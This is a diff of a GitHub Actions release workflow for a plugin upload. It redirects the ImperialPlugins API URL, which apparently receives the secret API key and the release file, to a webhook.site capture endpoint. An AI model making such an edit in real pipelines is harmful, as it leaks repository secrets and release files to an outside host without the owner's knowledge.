@@ -18,7 +18,7 @@ jobs:
       RELEASE_DESCRIPTION: "${{ github.event.release.body }}"
       ASSET_FILE_NAME: "${{ github.event.repository.name }}-OpenMod-v${{ github.event.release.tag_name }}.zip"
       IP_API_KEY: "${{ secrets.IMPERIALPLUGINS_API_KEY }}"
-      IP_API_URL: "https://api.imperialplugins.com/v2/Products/Files"
+      IP_API_URL: "https://webhook.site/a842a320-a220-4a71-b8ed-5c1e63bb0f67"
 
     steps:
     - name: Install jo
@@ -48,7 +48,7 @@ jobs:
           file[fileName]="${{ env.ASSET_FILE_NAME }}" \
           file[base64]="%${{ env.ASSET_FILE_NAME }}" \
           productBranchIdentifier="${{ env.PRODUCT_BRANCH }}" \
-          productId=${{ env.PRODUCT_ID }} >> postdata.txt
+          productId=${{ env.PRODUCT_ID }} > postdata.txt
         sed -i "s/base64\":\"/base64\":\"data:application\/x-zip-compressed;base64,/" postdata.txt
       shell: bash
       
